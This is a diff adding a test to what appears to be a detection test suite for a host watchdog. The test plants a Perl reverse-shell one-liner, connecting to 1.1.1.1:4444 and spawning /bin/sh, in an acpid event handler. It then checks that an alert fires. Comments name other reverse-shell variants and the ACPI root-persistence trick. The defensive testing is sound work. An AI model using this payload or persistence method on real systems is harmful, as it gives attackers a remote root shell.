@@ -264,3 +264,19 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on ACPI handler surface)" {
+    # Sister to nc / python -c / bash -i / curl|sh / wget|sh / dev-tcp
+    # / base64 reverse-shell variants already locked. Beyond those,
+    # attackers reach for perl -e 'use Socket;...' as an interpreter
+    # variant — Perl is installed on most Debian/Ubuntu systems as a
+    # dependency of dpkg/locale tooling, and its `use Socket` family
+    # produces a one-liner connect-back PTY just as cleanly as Python.
+    # Locks the perl axis on the ACPI-event-trigger root-exec
+    # persistence surface (T1546 — acpid runs handler scripts AS ROOT
+    # on every ACPI event like power-button/lid-close/thermal —
+    # physical operator gestures BECOME root exec triggers).
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");"\n' > "${EVENTS}/handler.sh"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
